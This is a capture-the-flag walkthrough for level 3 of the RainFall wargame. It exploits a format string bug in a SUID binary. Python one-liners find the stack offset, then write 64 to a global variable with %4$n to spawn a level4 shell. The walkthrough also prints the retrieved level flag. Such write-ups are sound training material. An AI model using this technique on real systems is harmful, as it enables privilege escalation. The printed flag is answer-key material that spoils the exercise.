# Level 3 Walkthrough

## Who am I?

```bash
level3@RainFall:~$ id
uid=2003(level3) gid=2003(level3) groups=2003(level3)
```

## Where am I?

```bash
level3@RainFall:~$ ll
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3*
```

We are in possession of a SUID binary owned by `level4`. Our objective is to exploit this binary to gain a shell as `level4` and read the corresponding `.pass` file.

---

## Program Behavior

The binary reads input from `stdin`, prints it, and exits:

```bash
level3@RainFall:~$ ./level3
hello
hello
```

We try providing a large input:

```bash
level3@RainFall:~$ python -c "print 'A' * 200" | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

There is no crash, even with 200 characters. Unlike the previous level which used the unsafe `gets()`, this binary uses `fgets()`, which safely limits input size.

---

## GDB Analysis

### Disassemble `main()`

```gdb
(gdb) disas main
```

```asm
0x0804851a <+0>: push %ebp
0x0804851b <+1>: mov %esp,%ebp
0x0804851d <+3>: and $0xfffffff0,%esp
0x08048520 <+6>: call 0x80484a4 <v>
0x08048525 <+11>: leave
0x08048526 <+12>: ret
```

The `main()` function simply calls `v()`.

---

### Disassemble `v()`

```gdb
(gdb) disas v
```

We identify three important things:

1. Input is read with `fgets()` (safe from classic buffer overflow), unlike the previous level which used `gets()`.
2. The input is printed using `printf(buffer)` — **format string vulnerability!**
3. A comparison checks if a global variable `m` at `0x0804988c` is equal to 64 (`0x40`). If true, it launches a shell.

This logic was confirmed by decompiling the binary using Ghidra (see `source/ghidra/v.c`).

---

## Format String Vulnerability

`printf(buffer)` is unsafe because the format string is entirely user-controlled. This lets us:

* Print stack contents with `%x`
* Write to arbitrary memory with `%n`

---

## Exploitation Strategy

### Step 1: Find offset on the stack

We inject 10 `%x` to see where our input lands:

```bash
level3@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x"' | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078
```

We see that `AAAA` appears as `41414141` in hexadecimal, and it's the **4th** item on the stack. Therefore, we will use `%4$n` to write to the address placed as the 4th argument.

### Step 2: Inject address of `m` on the stack

```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c
```

We see `804988c` appear at position 4 confirmed. Since `printf` interprets the stack contents as integers or pointers, we had to inject the address in **little endian format** so that it’s correctly interpreted as `0x0804988c` on the stack.

### Step 3: Craft final payload

To exploit the vulnerability, we needed to:

* Identify the address to overwrite: `0x0804988c`, found from disassembly or decompilation.
* Determine the desired value: `64` (i.e. `0x40`) to pass the condition in the code: `if (m == 0x40)`.
* Discover that our input address appears as the 4th item on the stack (`%4$n`) through testing with multiple `%x`.
* Confirm that the input is copied via `fgets()` and used directly in `printf()`.

To write `64` to that address using `%n`, we must ensure that exactly **64 characters** are printed before `%4$n`. We use padding of 60 characters (`"A"*60`) plus the 4 bytes from the address.

To understand `%n`, consider this example:

```c
int written = 0;
printf("Hello world!%n", &written);
```

After executing, `written == 12`, because 12 characters were printed.

### Step 4: Build and launch the payload

```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/exploit
```

Run it:

```bash
level3@RainFall:~$ cat /tmp/exploit | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
```

However, this doesn't give a shell. We must use `cat -` to keep stdin open:

```bash
level3@RainFall:~$ cat /tmp/exploit - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
```

Finally, we read the flag:

```bash
$ cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

Success.

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `asm_analysis.md`: GDB analysis of the binary
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)